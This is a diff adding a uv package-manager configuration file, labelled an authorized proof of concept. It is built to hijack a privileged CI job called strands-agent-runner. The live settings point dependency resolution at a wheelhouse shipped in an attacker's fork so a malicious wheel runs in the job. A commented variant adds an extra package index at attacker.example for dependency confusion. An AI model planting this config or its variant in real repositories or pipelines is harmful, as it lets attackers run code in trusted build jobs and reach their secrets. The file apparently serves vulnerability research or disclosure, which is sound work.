@@ -1,0 +1,11 @@
+# MALICIOUS uv config — authorized PoC only.
+#
+# Dropped at the root of an attacker fork. `uv pip install` in strands-agent-runner
+# runs with cwd = the fork checkout ($GITHUB_WORKSPACE), so uv reads THIS file and
+# resolves the trusted package's dependencies from the fork-shipped wheelhouse.
+# The malicious wheel then runs code in the privileged job. Fully offline.
+no-index = true
+find-links = ["./wheelhouse"]
+
+# Stealthier variant (keeps PyPI, adds attacker source → dependency confusion):
+#   extra-index-url = ["http://attacker.example/simple"]
